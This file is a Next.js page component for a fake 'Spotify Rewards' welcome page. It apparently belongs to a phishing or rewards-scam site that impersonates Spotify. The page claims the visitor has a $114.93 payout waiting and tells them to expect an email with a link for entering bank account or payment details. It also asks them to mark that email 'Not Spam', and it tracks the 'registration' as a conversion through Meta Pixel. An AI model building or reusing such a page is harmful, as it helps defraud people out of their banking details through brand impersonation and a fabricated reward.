'use client';

import {
  AlertCircle,
  CheckCircle,
  Landmark,
  Mail,
  Music,
  Sparkles,
} from 'lucide-react';
import Image from 'next/image';
import Link from 'next/link';
import { useEffect, useState } from 'react';
import MetaPixelTracker from '../../components/MetaPixelTracker';

export default function SpotifyWelcomePage() {
  const [protocolId, setProtocolId] = useState('SP-849204');

  useEffect(() => {
    if (typeof window !== 'undefined') {
      const stored = sessionStorage.getItem('spotify_session_id');
      if (stored) {
        setProtocolId(stored);
      } else {
        const randomCode = `SP-${Math.floor(100000 + Math.random() * 900000)}`;
        sessionStorage.setItem('spotify_session_id', randomCode);
        setProtocolId(randomCode);
      }
    }
  }, []);

  return (
    <div className="min-h-screen bg-[#070707] text-[#e0e0e0] font-sans antialiased selection:bg-[#1db954] selection:text-black">
      {/* Meta Pixel Tracker for Welcome Page */}
      <MetaPixelTracker
        eventName="PageView"
        customData={{
          content_name: 'Spotify Rewards Welcome Page',
          status: 'Confirmed Registration',
          currency: 'USD',
          value: 114.93,
        }}
      />

      {/* Top Ambient Glow Accent */}
      <div className="fixed top-0 left-1/2 -translate-x-1/2 w-full max-w-4xl h-72 bg-gradient-to-b from-[#1db954]/15 via-[#1db954]/5 to-transparent blur-3xl pointer-events-none -z-10" />

      {/* Header */}
      <header className="sticky top-0 z-40 backdrop-blur-md bg-black/70 border-b border-white/5 px-4 sm:px-8 py-3.5 flex items-center justify-between max-w-5xl mx-auto w-full">
        <Link href="/spotify" className="flex items-center gap-2.5 transition-opacity hover:opacity-90">
          <div className="relative w-8 h-8 rounded-full overflow-hidden bg-black flex items-center justify-center">
            <Image
              src="/spotify-logo.webp"
              alt="Spotify Logo"
              width={32}
              height={32}
              priority
              referrerPolicy="no-referrer"
            />
          </div>
          <div className="flex items-center gap-1.5">
            <span className="text-white font-extrabold text-base tracking-tight">Spotify</span>
            <span className="bg-[#1db954] text-black text-[11px] font-black uppercase px-2 py-0.5 rounded-full tracking-wide">
              Rewards
            </span>
          </div>
        </Link>

        <div className="flex items-center gap-2">
          <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-semibold bg-[#1db954]/10 text-[#1db954] border border-[#1db954]/25">
            <span className="w-2 h-2 rounded-full bg-[#1db954] animate-pulse" />
            Enrolled &amp; Active
          </span>
        </div>
      </header>

      {/* Main Container */}
      <main className="max-w-2xl mx-auto px-4 py-8 sm:py-12">
        {/* Hero Section */}
        <div className="text-center mb-8">
          <div className="inline-block px-3.5 py-1 mb-4 rounded-full bg-white/[0.05] border border-white/10 text-xs uppercase tracking-widest font-bold text-gray-300">
            🎉 Registration Confirmed
          </div>

          <h1 className="text-3xl sm:text-4xl md:text-5xl font-black text-white tracking-tight leading-tight mb-4">
            Congratulations &amp; Welcome to{' '}
            <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#1db954] to-[#1ed760]">
              Spotify Rewards!
            </span>
          </h1>

          <p className="text-base sm:text-lg text-gray-300 max-w-lg mx-auto leading-relaxed">
            You are officially enrolled in the Spotify Rewards program. Your evaluation profile has been activated.
          </p>
        </div>

        {/* Payout & Banking Details Notice Card */}
        <div className="relative overflow-hidden rounded-2xl bg-gradient-to-br from-[#121212] to-[#181818] border border-[#1db954]/40 p-6 sm:p-7 mb-6 shadow-2xl shadow-black/80">
          <div className="flex items-start gap-4 pb-5 mb-5 border-b border-white/10">
            <div className="w-12 h-12 rounded-2xl bg-[#1db954] text-black flex items-center justify-center shrink-0 shadow-lg shadow-[#1db954]/20">
              <Mail className="w-6 h-6 stroke-[2.5]" />
            </div>
            <div>
              <div className="text-xs uppercase tracking-wider font-extrabold text-[#1db954] mb-1">
                Next Step: Email Delivery
              </div>
              <h2 className="text-lg sm:text-xl font-bold text-white mb-2 leading-snug">
                Check Your Email for Banking Details Request
              </h2>
              <p className="text-sm text-gray-300 leading-relaxed">
                Within a few hours, you will receive an official email containing all program instructions and a secure link to enter your <b className="text-white">bank account or payment details</b> to receive the transfer of your <b className="text-[#1db954]">$114.93 USD</b>.
              </p>
            </div>
          </div>

          {/* Reserved Amount Highlight Banner */}
          <div className="bg-black/50 rounded-xl p-4 border border-[#1db954]/20 flex items-center justify-between gap-4 mb-4">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-[#1db954]/10 border border-[#1db954]/30 flex items-center justify-center text-[#1db954] shrink-0">
                <Landmark className="w-5 h-5" />
              </div>
              <div>
                <span className="text-xs text-gray-400 block font-medium">Pending Payout Transfer</span>
                <span className="text-xs font-mono text-gray-400">Protocol #{protocolId}</span>
              </div>
            </div>
            <div className="text-right">
              <div className="text-2xl font-black text-white">$114.93 <span className="text-xs font-normal text-gray-400">USD</span></div>
              <span className="inline-flex items-center gap-1 text-[11px] font-semibold text-[#1db954]">
                <CheckCircle className="w-3 h-3" /> Ready for deposit
              </span>
            </div>
          </div>

          {/* Spam / Junk Alert */}
          <div className="bg-white/[0.03] rounded-xl p-3.5 border border-white/5 flex items-start gap-3">
            <AlertCircle className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
            <p className="text-xs text-gray-300 leading-relaxed">
              <b className="text-white">Please keep an eye on your inbox:</b> If you don&apos;t see the message within a few hours, check your <span className="text-amber-300 font-medium">Spam, Junk</span> or <span className="text-amber-300 font-medium">Promotions</span> folder, and mark it as <span className="text-white font-medium">&quot;Not Spam&quot;</span>.
            </p>
          </div>
        </div>

        {/* Simple 3-Step Summary */}
        <div className="rounded-2xl bg-[#121212] border border-white/10 p-6 mb-8">
          <h3 className="text-sm font-extrabold uppercase tracking-wider text-gray-400 mb-4 flex items-center gap-2">
            <Sparkles className="w-4 h-4 text-[#1db954]" />
            What happens next:
          </h3>

          <div className="space-y-3.5">
            <div className="flex items-start gap-3">
              <span className="w-6 h-6 rounded-full bg-[#1db954]/15 text-[#1db954] text-xs font-bold flex items-center justify-center shrink-0 mt-0.5">
                1
              </span>
              <p className="text-xs sm:text-sm text-gray-300">
                <b className="text-white">Receive Your Onboarding Email:</b> You will receive all instructions and guidelines in your inbox within a few hours.
              </p>
            </div>

            <div className="flex items-start gap-3">
              <span className="w-6 h-6 rounded-full bg-[#1db954]/15 text-[#1db954] text-xs font-bold flex items-center justify-center shrink-0 mt-0.5">
                2
              </span>
              <p className="text-xs sm:text-sm text-gray-300">
                <b className="text-white">Provide Your Banking Details:</b> Follow the secure email instructions to provide where your <b className="text-[#1db954]">$114.93 USD</b> payout should be deposited.
              </p>
            </div>

            <div className="flex items-start gap-3">
              <span className="w-6 h-6 rounded-full bg-[#1db954]/15 text-[#1db954] text-xs font-bold flex items-center justify-center shrink-0 mt-0.5">
                3
              </span>
              <p className="text-xs sm:text-sm text-gray-300">
                <b className="text-white">Start Evaluating Daily:</b> Access your member dashboard, listen to daily song releases, and receive ongoing payments.
              </p>
            </div>
          </div>
        </div>



        {/* Footer */}
        <footer className="mt-12 pt-6 border-t border-white/5 text-center text-xs text-gray-400 space-y-2">
          <p>&copy; {new Date().getFullYear()} Spotify Rewards Program. All rights reserved.</p>
          <div className="flex items-center justify-center gap-4 text-gray-400">
            <Link href="/politicasdeprivacidade" className="hover:text-gray-300 transition-colors">
              Privacy Policy
            </Link>
            <span>&bull;</span>
            <Link href="/suporte" className="hover:text-gray-300 transition-colors">
              Support
            </Link>
          </div>
        </footer>
      </main>
    </div>
  );
}
